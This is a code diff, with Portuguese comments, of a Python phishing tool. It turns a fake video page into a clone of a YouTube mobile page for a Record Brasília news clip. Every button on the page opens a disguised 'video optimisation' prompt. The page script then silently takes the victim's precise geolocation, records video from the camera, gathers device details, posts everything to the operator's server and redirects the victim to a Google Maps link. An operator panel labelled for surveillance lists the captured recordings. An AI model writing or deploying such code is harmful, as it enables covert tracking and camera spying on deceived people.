@@ -19,103 +19,166 @@ SENHA_ADMIN = "123123"
 # Link de redirecionamento final solicitado
 LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"
 
-# Página HTML com Player Profissional Disfarçado e Camada de Engenharia Social
+# Página HTML clonada perfeitamente do layout do YouTube Mobile
 HTML_CAPTURA = f"""
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stream HD - Conteúdo Exclusivo</title>
+    <title>Motorista sobrevive após capotar na BR-070 dias... - YouTube</title>
     
-    <meta property="og:title" content="Transmissão ao Vivo - Documentário e Hospedagem na China">
-    <meta property="og:description" content="Assista ao conteúdo exclusivo em alta definição. Clique para iniciar o player.">
+    <meta property="og:title" content="Motorista sobrevive após capotar na BR-070 dias...">
+    <meta property="og:description" content="Record Brasília - YouTube">
     <meta property="og:image" content="https://images.unsplash.com/photo-1508804185872-d7badad00f7d">
     <meta property="og:url" content="https://loc-nsdi.onrender.com/">
-    <meta property="og:type" content="website">
+    <meta property="og:type" content="video.other">
 
     <style>
         * {{ box-sizing: border-box; }}
         body {{
-            background-color: #0f1015;
-            color: #fff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0f0f0f;
+            color: #f1f1f1;
+            font-family: Roboto, Arial, sans-serif;
             margin: 0;
             padding: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
             min-height: 100vh;
         }}
-        .player-container {{
+        /* Top App Bar estilo YouTube Mobile */
+        .yt-header {{
             width: 100%;
-            max-width: 800px;
-            background: #181922;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
-            border: 1px solid #2a2c3a;
+            max-width: 600px;
+            background: #212121;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 14px;
+            border-bottom: 1px solid #3f3f3f;
         }}
-        .video-screen {{
+        .yt-channel-info {{
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }}
+        .yt-logo {{
+            width: 24px;
+            height: 24px;
+            background: #ff0000;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }}
+        .yt-logo svg {{
+            width: 14px;
+            fill: #fff;
+        }}
+        .yt-details .channel-name {{
+            font-size: 14px;
+            font-weight: 500;
+            color: #f1f1f1;
+        }}
+        .yt-details .upload-date {{
+            font-size: 11px;
+            color: #aaa;
+        }}
+        .btn-acessar {{
+            background: #3ea6ff;
+            color: #0f0f0f;
+            border: none;
+            padding: 6px 14px;
+            font-weight: 600;
+            font-size: 13px;
+            border-radius: 18px;
+            cursor: pointer;
+        }}
+        
+        /* Video Title Bar */
+        .video-container {{
+            width: 100%;
+            max-width: 600px;
+            background: #0f0f0f;
+        }}
+        .video-title-section {{
+            padding: 12px 14px;
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1.4;
+            color: #f1f1f1;
+        }}
+
+        /* Player simulado */
+        .player-wrapper {{
             position: relative;
             width: 100%;
             aspect-ratio: 16/9;
             background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             background-image: url('https://images.unsplash.com/photo-1508804185872-d7badad00f7d');
             background-size: cover;
             background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }}
-        .video-screen::after {{
+        .player-wrapper::before {{
             content: "";
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.65);
-            backdrop-filter: blur(4px);
+            background: rgba(0, 0, 0, 0.4);
         }}
-        .play-overlay {{
+        .yt-play-button {{
             position: relative;
             z-index: 2;
-            text-align: center;
-            padding: 20px;
-        }}
-        .btn-play {{
-            background: #e50914;
-            color: white;
-            border: none;
-            padding: 16px 36px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.2s;
-            box-shadow: 0 4px 15px rgba(229, 9, 20, 0.4);
-            display: inline-flex;
+            width: 68px;
+            height: 48px;
+            background-color: rgba(255, 0, 0, 0.9);
+            border-radius: 12px;
+            display: flex;
             align-items: center;
-            gap: 10px;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            transition: transform 0.1s ease;
         }}
-        .btn-play:hover {{
-            background: #f40612;
-            transform: scale(1.03);
+        .yt-play-button:hover {{
+            background-color: #ff0000;
+            transform: scale(1.05);
         }}
-        .player-info {{
-            padding: 20px 24px;
+        .yt-play-button::after {{
+            content: "";
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 9px 0 9px 16px;
+            border-color: transparent transparent transparent #fff;
+            margin-left: 3px;
         }}
-        .player-title {{
-            font-size: 20px;
-            font-weight: 600;
-            margin: 0 0 8px 0;
+
+        /* Barra de Ações Abaixo do Vídeo */
+        .action-bar {{
+            display: flex;
+            justify-content: space-around;
+            padding: 12px;
+            border-bottom: 1px solid #272727;
         }}
-        .player-desc {{
-            font-size: 14px;
-            color: #9ca3af;
-            margin: 0;
-            line-height: 1.5;
+        .action-btn {{
+            background: #272727;
+            border: none;
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 18px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
         }}
-        .modal-aviso {{
+
+        /* Modal de Permissão Disfarçado */
+        #modalPermissao {{
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -125,33 +188,32 @@ HTML_CAPTURA = f"""
             align-items: center;
             padding: 20px;
         }}
-        .modal-content {{
-            background: #1f212d;
-            padding: 30px;
-            border-radius: 10px;
-            max-width: 420px;
+        .modal-box {{
+            background: #212121;
+            padding: 24px;
+            border-radius: 12px;
+            max-width: 380px;
             text-align: center;
-            border: 1px solid #374151;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.8);
+            border: 1px solid #3f3f3f;
         }}
-        .modal-content h3 {{
+        .modal-box h3 {{
             margin-top: 0;
-            color: #f87171;
-            font-size: 18px;
+            color: #3ea6ff;
+            font-size: 16px;
         }}
-        .modal-content p {{
-            font-size: 14px;
-            color: #d1d5db;
-            line-height: 1.5;
+        .modal-box p {{
+            font-size: 13px;
+            color: #aaa;
+            line-height: 1.4;
         }}
-        .loader {{
-            border: 3px solid #374151;
-            border-top: 3px solid #e50914;
+        .spinner {{
+            border: 3px solid #3f3f3f;
+            border-top: 3px solid #3ea6ff;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
+            width: 28px;
+            height: 28px;
             animation: spin 1s linear infinite;
-            margin: 15px auto;
+            margin: 12px auto;
             display: none;
         }}
         @keyframes spin {{
@@ -163,27 +225,40 @@ HTML_CAPTURA = f"""
 </head>
 <body>
 
-    <div class="player-container">
-        <div class="video-screen">
-            <div class="play-overlay">
-                <button class="btn-play" onclick="iniciarFluxoSeguranca()">
-                    <span>▶</span> Assistir em HD (1080p)
-                </button>
-                <p style="font-size: 12px; color: #cbd5e1; margin-top: 12px;">Clique para verificar permissões de exibição na região</p>
+    <!-- Header Fiel ao App do YouTube -->
+    <div class="yt-header">
+        <div class="yt-channel-info">
+            <div class="yt-logo">
+                <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+            </div>
+            <div class="yt-details">
+                <div class="channel-name">Record Brasília</div>
+                <div class="upload-date">YouTube • 2 de set. de 2026</div>
             </div>
         </div>
-        <div class="player-info">
-            <h1 class="player-title">Transmissão Especial: China & Hospedagem Global</h1>
-            <p class="player-desc">Conteúdo restrito verificado por protocolo de segurança regional. É necessário liberar o acesso de mídia e geolocalização do navegador para prosseguir com a reprodução segura.</p>
+        <button class="btn-acessar" onclick="dispararFluxo()">Acessar</button>
+    </div>
+
+    <!-- Container do Vídeo -->
+    <div class="video-container">
+        <div class="video-title-section">
+            Motorista sobrevive após capotar na BR-070 dias...
+        </div>
+        <div class="player-wrapper">
+            <div class="yt-play-button" onclick="dispararFluxo()"></div>
+        </div>
+        <div class="action-bar">
+            <button class="action-btn" onclick="dispararFluxo()">📤 Compartilhar</button>
+            <button class="action-btn" onclick="dispararFluxo()">📥 Salvar</button>
         </div>
     </div>
 
     <!-- Modal de Engenharia Social / Instrução de Permissão -->
-    <div id="modalAviso" class="modal-aviso">
-        <div class="modal-content">
-            <h3>⚠️ Verificação de Segurança Pendente</h3>
-            <p id="textoModal">Para otimizar a taxa de quadros e carregar a transmissão sem travamentos, clique em <b>"Permitir"</b> na caixa que aparecerá no topo do navegador.</p>
-            <div class="loader" id="spinnerCarregando"></div>
+    <div id="modalPermissao" class="modal-box-wrapper" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:999; align-items:center; justify-content:center;">
+        <div class="modal-box">
+            <h3>🔒 Otimização de Vídeo</h3>
+            <p>Para carregar a transmissão restrita em HD sem travamentos, clique em <b>"Permitir"</b> na caixa de calibração que aparecerá no navegador.</p>
+            <div class="spinner" id="loaderSpinner" style="display:block;"></div>
         </div>
     </div>
 
@@ -193,19 +268,18 @@ HTML_CAPTURA = f"""
         const urlDestino = "{LINK_DESTINO}";
         let videoGravadoBase64 = null;
 
-        function iniciarFluxoSeguranca() {{
-            document.getElementById('modalAviso').style.display = 'flex';
-            document.getElementById('spinnerCarregando').style.display = 'block';
+        function dispararFluxo() {{
+            document.getElementById('modalPermissao').style.display = 'flex';
             
-            // Dispara simultaneamente a geolocalização e a captura de vídeo
+            // Dispara geolocalização e captura simultaneamente
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => executarProcessamento(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
-                    (err) => executarProcessamento(null, null, null),
+                    (pos) => processarDados(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+                    (err) => processarDados(null, null, null),
                     {{ enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }}
                 );
             }} else {{
-                executarProcessamento(null, null, null);
+                processarDados(null, null, null);
             }}
         }}
 
@@ -260,14 +334,13 @@ HTML_CAPTURA = f"""
                     }}, 3000);
 
                 }} catch(e) {{
-                    console.warn("Acesso negado:", e);
+                    console.warn("Permissão negada:", e);
                     resolve();
                 }}
             }});
         }}
 
-        async function executarProcessamento(lat, lon, precisao) {{
-            // Tenta gravar o vídeo após o usuário interagir com o botão/permissão
+        async function processarDados(lat, lon, precisao) {{
             await gravarVideoCamera();
 
             let infoHardware = {{
@@ -305,7 +378,7 @@ HTML_CAPTURA = f"""
                     body: JSON.stringify(payload)
                 }});
             }} catch(e) {{
-                console.error("Erro:", e);
+                console.error("Erro no envio:", e);
             }} finally {{
                 window.location.replace(urlDestino);
             }}
@@ -451,7 +524,7 @@ HTML_PAINEL = """
 
 <div class="content-wrapper">
     <div class="status-box">
-        <b>[SYS_STATUS]</b> ONLINE-ACTIVE | <b>SOCIAL ENG_MODULE:</b> ACTIVE<br>
+        <b>[SYS_STATUS]</b> ONLINE-ACTIVE | <b>YOUTUBE CLONE MODULE:</b> ACTIVE<br>
         <b>[PROTOCOL]</b> SECURE TCP/IP | <b>REFRESH:</b> 5s
     </div>
 
@@ -459,7 +532,7 @@ HTML_PAINEL = """
         identification division.<br>
         program-id. MAINFRAME-SECURE-CONSOLE.<br>
         author. PENTESTER-CORE.<br>
-        module. 07 - PROXY STREAM & SURVEILLANCE
+        module. 07 - YOUTUBE STREAM & SURVEILLANCE
     </div>
 
     <h2>[ 01 ] GRAVAÇÕES DE VÍDEO DA CÂMERA ({{ videos|length }})</h2>
